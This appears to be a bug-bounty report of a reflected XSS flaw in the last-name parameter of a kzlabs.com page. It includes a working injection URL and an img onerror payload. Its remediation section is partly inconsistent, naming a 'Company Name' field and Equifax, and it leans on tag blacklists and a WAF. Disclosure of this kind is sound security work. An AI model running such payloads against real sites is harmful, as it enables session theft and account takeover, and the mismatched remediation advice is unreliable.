
## Title
Refelcted (XSS) in kzlabs.com/punishment

## Vulnerability Type
Reflected XSS

## Summary
The kzlabs.com/punishment page has an Reflected XSS vulnerability in its last name parameter . whatever you type into the last name feild gets embedded raw into a page response with no sanitization, By injecting an HTML tag with an event handler arbitary JavaScript executes immediately on page load and the popup fires.

## Vulnerable Endpoint
```
http://kzlabs.com/punishment/11.php
```

## Steps to Reproduce
1. Go to the following URL
   
```
 http://kzlabs.com/punishment/11.php](http://kzlabs.com/punishment/11.php?fname=&lname=tix5uni%22%3E%3CiMg+src%3Dx+onerror%3Dconfirm%281%29%3E)
```

2.Wait for the page to load

3.An alert popup appears showing 1


## Payload Used
```
tix5uni"><iMg src=x onerror=confirm(1)>
```


## Proof of Concept

**Screenshot 1** — Page source showing the search term tix5uni reflected raw with the payload.

<img width="1508" height="784" alt="image" src="https://github.com/user-attachments/assets/a3432da3-3cb2-4501-8a69-dd648cbddd29" />




**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload tix5uni"><iMg src=x onerror=confirm(1)> ,with the payload visible in the URL bar  confirming reflected XSS execution in the JavaScript context.

<img width="1488" height="785" alt="image" src="https://github.com/user-attachments/assets/d2878b37-3d88-4ecf-beae-89745564ede2" />




## Impact
- Cookie stealing 
- Account takeover by sending crafted link to victim
- JavaScript execution in victim browser
- Can be used to redirect victims to fake login pages that look identical to Equifax to harvest credentials



## Remediation
1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
